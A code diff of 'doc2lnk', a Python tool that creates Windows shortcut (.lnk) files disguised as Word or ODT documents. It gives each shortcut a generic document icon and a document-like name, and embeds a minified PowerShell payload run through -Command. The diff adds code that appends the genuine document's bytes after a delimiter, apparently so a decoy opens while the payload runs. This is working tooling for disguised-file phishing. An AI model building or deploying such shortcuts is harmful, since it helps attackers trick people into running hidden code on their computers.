@@ -1,30 +1,35 @@
 import pylnk3
+from ps_minifier.psminifier import minify
+
 import argparse
 import sys
 import os
 
 from . import pylnk3_patch
 from . import path_operations
+from . import ps_wrapper
 
 class Document:
     def __init__(self, document_path=None):
-        self.document_extensions = ["docx"]
+        self.document_extensions = ["docx", "odt"]
         self.document_path = None
+        self.document_content = None
 
         if type(document_path) == str or type(document_path) == unicode:
             self.document_path = document_path
             try:
-                file_handle = open(self.document_path, 'rb')
+                self.document_content = open(self.document_path, 'rb').read()
             except IOError:
                 for document_extension in self.document_extensions:
                     extended_path = document_path + "."  + document_extension
                     try:
                         self.document_path = extended_path
-                        file_handle = open(self.document_path, 'rb')
+                        self.document_content = open(self.document_path, 'rb').read()
                         break
                     except IOError:
                         self.document_path = None
                         continue
+
                 if self.document_path is None:
                     print(f"Error: The document '{document_path}' was not found.")
                     sys.exit(1)
@@ -33,21 +38,41 @@ class Document:
         self.icon_path = "C:\\Windows\\System32\\imageres.dll" # Contains generic Windows icons
         self.icon_index = 85 # Index within imageres.dll for document icon
 
-def write_lnk_using_document(target, document, arguments=None):
+def write_lnk_using_document(target, document, payload):
     try:
+        lnk_name = os.path.basename(document.document_path) + ".lnk"
+        delimiter = b"---LNK_DOCUMENT_BOUNDARY---"
+        script = minify(
+            ps_wrapper.wrap_powershell_script(
+                payload, 
+                path_operations.convert_to_os_specific_path(document.document_path), 
+                delimiter.decode("utf-8")
+            )
+        )
+
+        if not script:
+            raise Exception("Could not wrap powershell script.")
+
+        script_argument = ' -Command ' + script
+
         pylnk3.for_file(
             target_file=target,
-            lnk_name=os.path.basename(document.document_path) + ".lnk",
-            arguments=arguments,
+            lnk_name=lnk_name,
+            arguments=script_argument,
             description=None,
             icon_file=document.icon_path,
             icon_index=document.icon_index,
-            work_dir=path_operations.get_directory(document.document_path),
+            work_dir="%~dp0", # Directory of .lnk file
             window_mode=None,
         )
 
     except Exception as e:
         print(f"An error occured while writing .lnk file: {e}")
+        return
+
+    with open(lnk_name, "ab") as lnk_handle:
+        lnk_handle.write(delimiter)
+        lnk_handle.write(document.document_content)
 
 def main():
     program_title = "doc2lnk"
@@ -102,7 +127,7 @@ def main():
     else:
         payload = args.string
 
-    write_lnk_using_document(powershell_path, document, f' -Command {payload}')
+    write_lnk_using_document(powershell_path, document, payload)
 
 if __name__ == "__main__":
     main()
